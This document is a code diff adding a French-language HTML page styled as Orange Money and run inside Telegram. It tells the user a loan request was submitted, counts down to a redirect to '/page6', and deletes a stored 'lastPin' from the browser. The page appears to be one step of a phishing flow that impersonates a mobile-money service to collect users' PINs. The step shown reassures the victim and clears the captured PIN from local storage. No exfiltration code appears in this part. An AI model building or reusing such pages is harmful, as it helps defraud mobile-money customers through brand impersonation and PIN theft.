@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demande Envoyée - Orange Money</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f9fb;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .success-card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 20px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+        }
+
+        .check-circle {
+            width: 100px;
+            height: 100px;
+            background-color: #ff7900;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 30px;
+            color: white;
+            font-size: 50px;
+        }
+
+        h1 {
+            color: #ff7900;
+            font-size: 26px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        p {
+            color: #666;
+            font-size: 16px;
+            margin: 5px 0;
+            line-height: 1.4;
+        }
+
+        .timer-container {
+            background-color: #fff8f0;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 30px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            color: #e66d00;
+            font-weight: 500;
+        }
+
+        .loader-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #e0e0e0;
+            border-top: 2px solid #ff7900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-home {
+            background: white;
+            border: 1px solid #ddd;
+            color: #555;
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .top-toast {
+            position: fixed;
+            top: 20px;
+            background: #1a1c1e;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            z-index: 1000;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="top-toast">
+    <span style="color:#ff7900;">✔</span>
+    <span>Demande envoyée avec succès !</span>
+</div>
+
+<div class="success-card">
+    <div class="check-circle">✓</div>
+
+    <h1>Demande de Prêt<br>Soumise</h1>
+
+    <p>Votre demande a été enregistrée. Veuillez patienter pendant l'analyse de votre dossier.</p>
+    <p>Vous recevrez un message de confirmation sous peu.</p>
+
+    <div class="timer-container">
+        <div class="loader-spinner"></div>
+        <span>
+            Retour à l'accueil Orange Money dans 
+            <span id="timer">5</span> secondes...
+        </span>
+    </div>
+
+    <button type="button" class="btn-home" onclick="goToPage6()">
+        Retourner à l'accueil maintenant
+    </button>
+</div>
+
+<script>
+    let timeLeft = 5;
+    let interval;
+
+    function updateTimer() {
+        const el = document.getElementById('timer');
+        if (el) el.textContent = timeLeft;
+    }
+
+    function goToPage6() {
+        if (interval) clearInterval(interval);
+
+        // Suppression sécurisée du PIN temporaire
+        localStorage.removeItem('lastPin');
+        
+        window.location.href = "/page6";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        updateTimer();
+
+        interval = setInterval(() => {
+            timeLeft--;
+
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                goToPage6();
+                return;
+            }
+
+            updateTimer();
+        }, 1000);
+    };
+</script>
+
+</body>
+</html>
